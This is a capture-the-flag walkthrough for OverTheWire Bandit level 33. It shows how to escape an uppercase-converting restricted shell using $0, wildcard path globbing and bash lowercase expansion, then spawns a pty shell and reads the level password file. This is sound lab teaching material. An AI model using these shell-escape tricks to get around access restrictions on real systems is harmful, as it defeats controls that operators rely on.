# Bandit Level 32 → Level 33

## Level Goal

After all this `git` stuff, it’s time for another escape. Good luck!

## Commands you may need to solve this level

sh, man

## Methodology
- For this level, We don't have any instructions i guess.
- Let's login into bandit32 with obtained credentials.
```
┌──(kali㉿kali)-[~/Desktop/overthewire]
└─$ ssh bandit32@bandit.labs.overthewire.org -p 2220             
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-1
bandit32@bandit.labs.overthewire.org's password: 
...
...
...
  Enjoy your stay!

WELCOME TO THE UPPERCASE SHELL
>>
```
- Different type of shell is it.
```

WELCOME TO THE UPPERCASE SHELL
>> whoami
>> echo $SHELL
sh: 1: ECHO: Permission denied
>> ls -al
sh: 1: LS: Permission denied
sh: 1: WHOAMI: Permission denied
>> WHOAMI
sh: 1: WHOAMI: Permission denied
```
- According to my observations, whatever we're typing, it gets converted into UPPERCASE. 
- Numbers and special characters don't get converted into UPPERCASE right?
```
>> 12
sh: 1: 12: Permission denied
>> $
sh: 1: $: Permission denied
```
- No, But we are still getting `Permission denied`, we have to shell first using non-alpha characters.
- After hit and trial searching on internet, found some ways to bypass this.
```
>> CMD=WHOAMI
>> ${CMD,,}
sh: 1: Bad substitution
```
- Above method seems to work but it's not, because default shell is not bash.
- Below wildcard method is partially working. As two or three character command are many, ls, cd, sh.
```
>> /???/??????
base32: extra operand '/bin/basenc'
Try '/bin/base32 --help' for more information.
>> /???/????
error: unexpected argument '/bin/bash' found

Usage: arch

For more information, try '--help'.
>> /bin/bash
sh: 1: /BIN/BASH: not found
>> /???/??
/bin/ar: invalid option -- '/'
Usage: /bin/ar [emulation options] [-]{dmpqrstx}[abcDfilMNoOPsSTuvV] [--plugin <name>] [member-name] [count] archive-file file...
       /bin/ar -M [<mri-script]
 commands:
  d            - delete file(s) from the archive
  m[ab]        - move file(s) in the archive
  p            - print file(s) found in the archive
...
```
- Let's try `$0` and it worked.
```
>> $0
$ whoami
bandit33
$ cat /etc/bandit_pass/bandit33
REDACTED
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
bandit33@bandit:~$ whoami
bandit33
```
- We got the password of bandit33, next level.
## Additional Work
### Method 1: The Shell Variable Bypass (`$0`)

```
>> $0
```

- **Why it works:** In Unix shells, `$0` is a special variable that expands to the name of the currently running shell executable (usually `sh` or `bash`).
- Because `$` and `0` are non-alphabetic symbols, the uppercase filter doesn't change them.
- Executing `$0` spawns a brand-new, unrestricted sub-shell, giving a standard command prompt (e.g., `$` ).
- If `$0` expands to something executable (e.g., `bash` or `sh`): it may start that program.
- If `$0` expands to a script name that isn’t in `PATH` (e.g., `myscript.sh`): get `command not found`.
- If `$0` expands to an empty string (rare): it effectively becomes “run nothing” and may give an error depending on the shell.
### Method 2: Wildcard / Globbing Path Expansion

In Linux, you can run commands without using letters by leveraging path globbing with symbols like `?` (matches any single character) and `*`.
To run commands like `/bin/cat` or `/bin/pwd`:
```
>> /???/???
```
- **Why it works:** Shell wildcard expansion translates `/???/???` to matching binaries like `/bin/cat` or `/bin/pwd` before execution.

### Method 3: Parameter Lowercasing (Modern Bash)
If the underlying shell interpreter supports Bash variable modification, we can define an uppercase variable and force Bash to evaluate it in lowercase:
```
>> CMD=WHOAMI
>> ${CMD,,}
```
- **Why it works:** `${CMD,,}` converts the string value stored in `CMD` into lowercase letters (`whoami`) at runtime, bypassing input-time filtering.

## Key Takeaways / Concepts
- **Uppercase Input Filters:** Some restricted environments automatically convert all user input to uppercase, breaking standard lowercase command execution.
- **Special Shell Variables (`$0`):** Using non-alphabetic variables like `$0` (which expands to the name of the current shell executable) bypasses the casing filter entirely and allows you to spawn an unrestricted sub-shell.
- **Wildcard Path Globbing (`/???/???`):** You can execute system binaries without typing any alphabetical characters by leveraging globbing characters (`?` and `*`) to match paths like `/bin/sh` or `/bin/bash`.